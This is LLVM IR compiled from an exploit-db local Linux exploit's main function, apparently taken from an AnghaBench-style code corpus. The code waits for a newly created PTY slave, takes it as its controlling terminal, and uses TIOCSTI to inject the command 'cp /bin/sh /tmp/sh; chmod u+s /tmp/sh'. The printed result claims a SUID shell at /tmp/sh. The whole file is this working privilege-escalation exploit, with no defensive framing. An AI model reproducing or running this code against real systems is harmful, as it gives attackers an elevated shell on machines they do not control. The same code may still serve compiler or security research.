; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41173.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41173.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [39 x i8] c"cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [22 x i8] c"Usage: %s /dev/pts/X\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"Where X is next slave device to be created\0A\00", align 1
@F_OK = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [30 x i8] c"[-] %s device already exists\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"[-] fork failed\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"[*] Waiting for slave device %s\0A\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [22 x i8] c"[+] Got PTY slave %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [47 x i8] c"[+] Making PTY slave the controlling terminal\0A\00", align 1
@TIOCSCTTY = common dso_local global i32 0, align 4
@TIOCSTI = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [27 x i8] c"[+] SUID shell at /tmp/sh\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  store i32 -1, i32* %8, align 4
  %9 = load i32, i32* %4, align 4
  %10 = icmp ne i32 %9, 2
  br i1 %10, label %11, label %19

11:                                               ; preds = %2
  %12 = load i32, i32* @stderr, align 4
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %12, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i8* %15)
  %17 = load i32, i32* @stderr, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %85

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = load i32, i32* @F_OK, align 4
  %24 = call i32 @access(i8* %22, i32 %23)
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %32, label %26

26:                                               ; preds = %19
  %27 = load i32, i32* @stderr, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %27, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i8* %30)
  store i32 1, i32* %3, align 4
  br label %85

32:                                               ; preds = %19
  %33 = call i32 (...) @fork()
  store i32 %33, i32* %7, align 4
  %34 = load i32, i32* %7, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %39

36:                                               ; preds = %32
  %37 = load i32, i32* @stderr, align 4
  %38 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %85

39:                                               ; preds = %32
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %82

42:                                               ; preds = %39
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0), i8* %45)
  br label %47

47:                                               ; preds = %50, %42
  %48 = load i32, i32* %8, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %56

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = load i32, i32* @O_WRONLY, align 4
  %55 = call i32 @open(i8* %53, i32 %54)
  store i32 %55, i32* %8, align 4
  br label %47

56:                                               ; preds = %47
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* %59)
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.7, i64 0, i64 0))
  %62 = load i32, i32* %8, align 4
  %63 = call i32 @dup2(i32 %62, i32 0)
  %64 = load i32, i32* %8, align 4
  %65 = call i32 @dup2(i32 %64, i32 1)
  %66 = load i32, i32* %8, align 4
  %67 = call i32 @dup2(i32 %66, i32 2)
  %68 = call i32 (...) @setsid()
  %69 = load i32, i32* @TIOCSCTTY, align 4
  %70 = call i32 @ioctl(i32 0, i32 %69, i32 1)
  br label %71

71:                                               ; preds = %75, %56
  %72 = load i8*, i8** %6, align 8
  %73 = load i8, i8* %72, align 1
  %74 = icmp ne i8 %73, 0
  br i1 %74, label %75, label %81

75:                                               ; preds = %71
  %76 = load i32, i32* @TIOCSTI, align 4
  %77 = load i8*, i8** %6, align 8
  %78 = getelementptr inbounds i8, i8* %77, i32 1
  store i8* %78, i8** %6, align 8
  %79 = ptrtoint i8* %77 to i32
  %80 = call i32 @ioctl(i32 0, i32 %76, i32 %79)
  br label %71

81:                                               ; preds = %71
  br label %85

82:                                               ; preds = %39
  %83 = call i32 @wait(i32* null)
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %85

85:                                               ; preds = %11, %26, %36, %82, %81
  %86 = load i32, i32* %3, align 4
  ret i32 %86
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @access(i8*, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @setsid(...) #1

declare dso_local i32 @ioctl(i32, i32, i32) #1

declare dso_local i32 @wait(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
